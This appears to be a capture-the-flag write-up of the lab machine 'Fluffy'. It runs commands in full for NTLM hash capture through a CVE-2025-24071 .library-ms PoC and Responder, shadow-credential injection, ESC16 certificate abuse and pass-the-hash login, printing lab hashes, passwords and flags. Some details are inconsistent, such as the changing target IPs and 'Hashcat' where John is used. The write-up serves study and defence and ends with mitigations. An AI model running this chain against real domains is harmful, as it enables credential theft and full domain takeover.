
# Machine Information

<table>
<tr>
<td><strong>IP Address</strong></td>
<td>10.129.232.88</td>
</tr>
<tr>
<td><strong>Operating System</strong></td>
<td>Windows</td>
</tr>
<tr>
<td><strong>Hostname</strong></td>
<td>DC01</td>
</tr>
<tr>
<td><strong>Domain</strong></td>
<td>fluffy.htb</td>
</tr>
<tr>
<td><strong>Release Date</strong></td>
<td>May 20251</td>
</tr>
<tr>
<td><strong>Difficulty</strong></td>
<td>Easy</td>
</tr>
</table>


# Machine Description

Fluffy is an Easy-difficulty Windows machine centered around an assumed breach scenario, providing initial access via a low-privileged user account. The exploitation path begins by leveraging CVE-2025-24071 to obtain credentials for a second low-privileged user. Further Active Directory enumeration reveals permissive ACLs governing both the `winrm_svc` and `ca_svc` accounts, allowing lateral movement to `winrm_svc` and subsequent interactive access via WinRM. Finally, privilege escalation to the Domain Administrator is achieved by exploiting an Active Directory Certificate Services (AD CS) vulnerability, specifically leveraging the `ca_svc` account to abuse an ESC16 misconfiguration.


# Exploitation Summary

The attack chain involved:
1. **Initial Access**: Extracting NTLM credentials through SMB share access and exploiting CVE-2025-24071
2. **Credential Cracking**: Hashcat-assisted cracking of the captured Net-NTLM hash
3. **AD Enumeration**: Comprehensive BloodHound enumeration to identify attack paths
4. **Privilege Escalation**: Shadow credentials injection on service accounts
5. **AD CS Exploitation**: Leveraging ESC16 vulnerability to request certificates as Administrator
6. **Complete Compromise**: Obtaining Domain Administrator access through certificate-based authentication



# Detailed Walkthrough

## Road to User flag

### ***Phase 1: Initial Network Reconnaissance and Service Discovery***

I began by performing a comprehensive Nmap scan to identify open ports and services running on the target:

```
$ nmap -Pn -sV 10.129.232.88

...SNIP..

PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP
445/tcp  open  microsoft-ds  
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0
9389/tcp open  adws

...SNIP...
```

The presence of Kerberos (port 88), LDAP (port 389), and WinRM (port 5985) confirmed this was a fully functional Domain Controller.
### ***Phase 2: SMB Share Enumeration***

I enumerated SMB shares to identify accessible resources:

```
$ smbclient -L 10.129.232.88 -U j.fleischman%J0elTHEM4n1990!
```

I discovered that the `IT` share was readable and writable. Upon accessing the share, I found several interesting files:

```
IT/
├── Everything-1.4.1.1026.x64.zip
├── KeePass-2.58.zip
└── Upgrade_Notice.pdf
```

I retrieved the `Upgrade_Notice.pdf` file which contained critical information about a scheduled system upgrade to patch some discovered vulnerabilities.

![](HTB-machines/Easy/Windows/Fluffy/1.png)

### ***Phase 3: CVE-2025-24071 Exploitation***

Among the vulnerabilities listed in `Upgrade_Notice.pdf`, CVE-2025-24071 stands out as a critical flaw in Microsoft Windows File Explorer. This vulnerability enables attackers to capture NTLM credentials by exploiting maliciously crafted network shares, thereby facilitating credential theft and potentially leading to wider system compromise. I created a malicious `.library-ms` file using a PoC found in [CVE-2025-24071_PoC/PoC.py at main · Marcejr117/CVE-2025-24071_PoC · GitHub](https://github.com/Marcejr117/CVE-2025-24071_PoC/blob/main/PoC.py), designed to trigger NTLM authentication:

```
$ python3 PoC.py test 10.10.14.102  
```

I uploaded the exploit archive to the IT share:

```
$ smbclient -U j.fleischman%J0elTHEM4n1990! -c "put exploit.zip" //10.129.232.88/IT
```

I set up a Responder listener on my attacking machine to capture Net-NTLMv2 hash when a user accessed the malicious file. Within moments, I captured the Net-NTLMV2 hash of user `p.agila`:

```
$ sudo responder -I tun0

...SNIP...

[+] Listening for events...  
  
[SMB] NTLMv2-SSP Client   : 10.129.232.88
[SMB] NTLMv2-SSP Username : FLUFFY\p.agila
[SMB] NTLMv2-SSP Hash     : p.agila::FLUFFY:6fab96df52daa0d1:6C8170E597369E819D77654BC5C8FFF7:...SNIP...

...SNIP...
```

### ***Phase 4: Hash Cracking***

I saved the captured hash to a file and used John the Ripper to crack it and abtain the password of `p.agila`:

```
$ echo "p.agila::FLUFFY:6fab96df52daa0d1:6C8170E597369E819D77654BC5C8FFF7:..." > hash.hashes
```

```
$ john hash.hashes --wordlist=/usr/share/wordlists/rockyou.txt

...SNIP
 
prometheusx-303  (p.agila)

...SNIP...
```

The hash was successfully cracked, revealing the password `prometheusx-303`
### ***Phase 5: BloodHound Enumeration***

After obtaining the credentials of user `p.agila`, I collected comprehensive Active Directory data using BloodHound Data Collector to identify attack paths:

```
$ python3 ~/Tools/BloodHound.py/bloodhound.py -d fluffy.htb -c all -u p.agila -p prometheusx-303 -ns 10.129.232.88 -k
```

After collecting all the domain data, I uploaded them via BloodHound GUI, searched for Transitive Object Control for the user `p.agila`, and discovered several useful informations:

![](HTB-machines/Easy/Windows/Fluffy/2.png)

From this, we can see a clear attack path:
- User `p.agila` had `GenericWrite` over the `SERVICE ACCOUNTS` group
- The "SERVICE ACCOUNTS" group had `GenericWrite` over several service accounts including `winrm_svc` and `ca_svc`
- `ca_svc` had elevated privileges that could lead to domain compromise
### ***Phase 6: Adding p.agila to Service Accounts Group***

Leveraging the `GenericWrite` privilege discovered in BloodHound, I added `p.agila` to the `SERVICE ACCOUNTS` group:

```
$ net rpc group addmem "SERVICE ACCOUNTS" "p.agila" -U "fluffy.htb/p.agila%prometheusx-303" -S "10.129.232.88"
```

Verification confirmed the successful addition:

```
$ net rpc group members "SERVICE ACCOUNTS" -U "fluffy.htb/p.agila%prometheusx-303" -S "10.129.232.88"
FLUFFY\ca_svc  
FLUFFY\ldap_svc  
FLUFFY\p.agila  
FLUFFY\winrm_svc
```

### ***Phase 7: Shadow Credentials on winrm_svc***

Now that `p.agila` is a member of the `SERVICE ACCOUNTS` group with `GenericWrite` over `winrm_svc`, I used Certipy to inject shadow credentials in `msDS-KeyCredentialLink` attribute of `winrm_svc` account:

```
$ certipy-ad shadow auto -u p.agila@fluffy.htb -p 'prometheusx-303' -account winrm_svc -dc-ip 10.129.94.190 -dc-host dc01.fluffy.htb
[*] Targeting user 'winrm_svc'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID '44b9b20536c4474ca38c5bacef593c08'
[*] Adding Key Credential with device ID '44b9b20536c4474ca38c5bacef593c08' to the Key Credentials for 'winrm_svc'
[*] Successfully added Key Credential with device ID '44b9b20536c4474ca38c5bacef593c08' to the Key Credentials for 'winrm_svc'
[*] Authenticating as 'winrm_svc' with the certificate
[*] Certificate identities:
[*]     No identities found in this certificate
[*] Using principal: 'winrm_svc@fluffy.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'winrm_svc.ccache'
[*] Wrote credential cache to 'winrm_svc.ccache'
[*] Trying to retrieve NT hash for 'winrm_svc'
[*] Restoring the old Key Credentials for 'winrm_svc'
[*] Successfully restored the old Key Credentials for 'winrm_svc'
[*] NT hash for 'winrm_svc': 33bd09dcd697600edf6b3a7af4875767
```

The `shadow auto` flag orchestrates the entire attack lifecycle through five distinct phases:
1. **Key Pair Generation:** Certipy creates a local X.509 certificate and a public/private cryptographic key pair associated with a unique `DeviceID`.
2. **Attribute Injection:** Leveraging `p.agila`'s write permissions, Certipy updates the target account's (`winrm_svc`) **`msDS-KeyCredentialLink`** attribute by injecting the newly generated Key Credentials structure containing the public key.
3. **PKINIT Authentication (AS-REQ):** Certipy initiates a Kerberos pre-authentication process using Public Key Cryptography (`PKINIT`), signing the `AS-REQ` with the local private key. The Domain Controller (`dc01.fluffy.htb`) validates the signature against the public key stored in the user's Active Directory attribute and issues an Authentication Service Response (`AS-REP`).
4. **Hash Extraction:** While in standard password-based Kerberos authentication the NT hash is used as the key to encrypt the response (EncData), the PKINIT extension changes this behavior entirely. Since authentication here relies on asymmetric cryptography, the KDC encrypts the EncData using the client's public key instead. Because the NT hash is no longer serving as the encryption key, the DC explicitly includes the raw NT hash inside the encrypted structure for legacy NTLM fallback compatibility. Certipy decrypts this section with its private key, opening the envelope and recovering the exposed NT hash directly from the response
5. **Post-Exploitation Cleanup:** To remain stealthy and avoid breaking legitimate authentications, Certipy automatically removes the injected public key from the `msDS-KeyCredentialLink` attribute, restoring the Active Directory object to its original state.

As we can see, the attack succeeded and Certipy retrieving the NTLM hash of `winrm_svc` account: `33bd09dcd697600edf6b3a7af4875767`
### ***Phase 8: Get the flag***

Using the obtained NTLM hash, I accessed the Domain Controller as `winrm_svc` via WinRM and retrieved the user flag:

```
$ evil-winrm -i 10.129.232.88 -u winrm_svc -H 33bd09dcd697600edf6b3a7af4875767
```

```
*Evil-WinRM* PS C:\Users\winrm_svc\Documents> type C:\Users\winrm_svc\Desktop\user.txt
```

<mark>User flag</mark>: `42caf27510e116ef2d38e9bae4651d0f`

## Road to Root flag
### ***Phase 1: Escalation to ca_svc***

Although `winrm_svc` had limited privileges, group membership in `SERVICE ACCOUNTS` provided access to escalate further. Since `ca_svc` is the service account for the AD CS service of the domain, I injected shadow credentials on `ca_svc` to get his NTLM hash:

```
$ certipy-ad shadow auto -u winrm_svc@fluffy.htb -hashes '33bd09dcd697600edf6b3a7af4875767' -account ca_svc -dc-ip 10.129.232.88

...SNIP...

[*] NT hash for 'ca_svc': ca0f4f9e9eb8a092addf53bb03fc98c8
```

### ***Phase 2: Active Directory Certificate Services Enumeration***

With `ca_svc` credentials, I enumerated the AD CS infrastructure to identify vulnerabilities:

```
$ certipy-ad find -u ca_svc -hashes ca0f4f9e9eb8a092addf53bb03fc98c8 -dc-ip 10.129.232.88
```

The Certipy output in `20260928172724_Certipy.txt` revealed the presence of ESC16 vulnerability:

```
Certificate Authorities
  0
    CA Name                             : fluffy-DC01-CA
    DNS Name                            : DC01.fluffy.htb
...SNIP...
	
    [!] Vulnerabilities
      ESC16                             : Security Extension is disabled.
    [*] Remarks
      ESC16                             : Other prerequisites may be required for this to be exploitable. See the wiki for more details.

...SNIP...
```

The ESC16 vulnerability occurs when a Certification Authority (CA) is misconfigured to omit the user's SID extension from the certificates it issues. This scenario typically arises if an administrator manually disables this security extension in the registry or if the CA server is not correctly updated. Under normal conditions, Domain Controllers rely on this SID extension to securely validate the identity of the authenticating account. However, if the SID is missing and the Domain Controller is not operating in Full Enforcement mode, the system falls back to a legacy mapping method, authenticating the session based solely on the UPN (User Principal Name) attribute embedded in the certificate. This configuration opens up a direct Privilege Escalation vector. An attacker with permissions to modify an account's UPN can temporarily change it to match a highly privileged target (such as the Administrator). When a certificate is requested from the vulnerable CA, it is issued without the safety SID extension. After reverting the UPN back to its original value to avoid detection, the attacker can use the generated certificate to successfully impersonate the target user, gaining full control over the Active Directory domain.
### ***Phase 3: ESC16 exploitation***

First, I temporarily changed `ca_svc`'s UPN to `administrator`:

```
$ certipy-ad account update -u 'ca_svc@fluffy.htb' -hashes 'ca0f4f9e9eb8a092addf53bb03fc98c8' -user ca_svc -upn 'administrator' -dc-ip 10.129.232.88
```

Subsequently, I requested a certificate as the Administrator account, since `ca_svc` has `administrator` in his UPN attribute:

```
$ certipy-ad req -u 'ca_svc' -hashes ca0f4f9e9eb8a092addf53bb03fc98c8 -dc-ip '10.129.232.88' -ca 'fluffy-DC01-CA' -template 'User'

...SNIP...
 
[*] Successfully requested certificate  
[*] Got certificate with UPN 'administrator'  

...SNIP...
 
[+] Data written to 'administrator.pfx'  
[*] Wrote certificate and private key to 'administrator.pfx'
```

The certificate was successfully generated. Once i obtained a certificate for the `Administrator` Account, I restored the original `ca_svc` UPN:

```
$ certipy-ad account update -u 'ca_svc@fluffy.htb' -hashes 'ca0f4f9e9eb8a092addf53bb03fc98c8' -user ca_svc -upn 'ca_svc@fluffy.htb' -dc-ip 10.129.232.88
```

Finally, I used the `Administrator` certificate to obtain a Kerberos TGT and NTLM hash:

```
$ certipy-ad auth -pfx administrator.pfx -domain 'fluffy.htb' -dc-ip 10.129.232.88

...SNIP...
  
[*] Got hash for 'administrator@fluffy.htb': aad3b435b51404eeaad3b435b51404ee:8da83a3fa618b6e3a00e93f676c92a6e
```

### ***Phase 4: Get the flag***

Using the `Administrator` NTLM hash, I achieved complete Domain Controller access and retrieved the root flag:

```
$ evil-winrm -i 10.129.95.176 -u administrator -H 8da83a3fa618b6e3a00e93f676c92a6e  
```

```
*Evil-WinRM* PS C:\Users\Administrator\Documents> type C:\Users\Administrator\Desktop\root.txt
```

<mark>Root flag</mark>: `e7a702455f39f8149c86b662adc95b63`

# Key Vulnerabilities Exploited

- **CVE-2025-24071**: Arbitrary code execution through malicious .library-ms files
- **Overly Permissive Active Directory Permissions**: `GenericWrite` on critical groups and accounts
- **Shadow Credentials Abuse**: Injection of certificate-based authentication credentials
- **ESC16**: Disabled security extension in AD CS allowing unauthorized certificate issuance
- **Lack of UPN Validation**: Certificate issuance without proper identity validation


# Conclusion

The Fluffy machine demonstrates how multiple misconfigurations combine to enable complete domain compromise. From initial credential theft via CVE-2025-24071 through overly permissive group permissions, shadow credentials abuse, and finally ESC16 certificate forgery, each stage exploited the previous vulnerability. This emphasizes the importance of strict permission management, timely patching, proper Active Directory hardening, and secure configuration of Certificate Services. To mitigate these vulnerabilities, organizations should prioritize patching of publicly disclosed vulnerabilities like CVE-2025-24071 that enable credential theft through file system exploits. Active Directory permissions should be regularly audited to eliminate overly permissive `GenericWrite` and `GenericAll` privileges on critical groups and service accounts. Service accounts should be protected with strong, unique credentials and monitored for suspicious authentication patterns, with shadow credentials only allowed where absolutely necessary and monitored closely. Certificate Authority infrastructure must maintain the SID extension security feature enabled and configured for Full Enforcement mode to prevent UPN-based impersonation attacks. UPN modifications should require approval workflows and be subject to real-time alerts to detect unauthorized changes. Regular security assessments should identify and remediate misconfigurations in Active Directory Certificate Services before they can be exploited. This case study underscores that Active Directory security requires defense in depth, as layered misconfigurations create a path to domain administrator access.
